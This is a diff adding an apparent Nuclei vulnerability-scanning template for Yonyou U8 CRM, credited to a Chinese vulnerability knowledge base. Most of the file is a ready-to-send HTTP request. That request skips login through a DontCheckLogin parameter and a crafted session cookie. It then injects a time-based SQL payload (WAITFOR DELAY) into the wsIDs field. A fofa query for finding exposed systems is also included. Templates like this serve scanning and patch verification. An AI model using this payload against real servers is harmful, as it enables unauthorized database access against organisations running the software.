@@ -1,0 +1,30 @@
+id: poc-grmh8kuf618l6hu2
+info:
+  name: 用友U8CRM checkselectworksheet存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/grmh8kuf618l6hu2'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: grmh8kuf618l6hu2
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /servicequotation/checkselectworksheet.php?DontCheckLogin=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+
+    wsIDs=1);WAITFOR+DELAY+''0:0:5''--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
